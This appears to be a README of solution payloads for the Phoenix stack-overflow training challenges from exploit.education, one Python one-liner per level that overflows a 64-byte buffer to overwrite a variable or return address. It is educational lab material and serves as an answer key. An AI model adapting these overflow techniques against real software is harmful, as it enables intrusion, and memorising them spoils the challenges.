# ExploitEducation Phoenix

*Binary exploit challenges from **[Phoenix](https://exploit.education/phoenix/)***
## Payloads
*\* Still in progress*
- stack-zero:
```
    $ python -c "print 'A' * 64 + 'hehe'" | ./stack-zero
```
- stack-one:
```
    $ ./stack-one $(python -c "print 'A' * 64 + '\x62\x59\x6c\x49'")
```
- stack-two:
```
    $ env ExploitEducation="$(python -c "print 'A' * 64 + '\x0a\x09\x0a\x0d'")" ./stack-two
```
- stack-three:
```
    $ python -c "print 'A' * 64 + '\x9d\x06\x40\x00\x00\x00\x00\x00'" | ./stack-three
```
- stack-four:
```
    $ python -c "print 'A' * 0x50 + 'B' * 8 + '\x1d\x06\x40'" # 88 bytes of stack frame then RIP
```

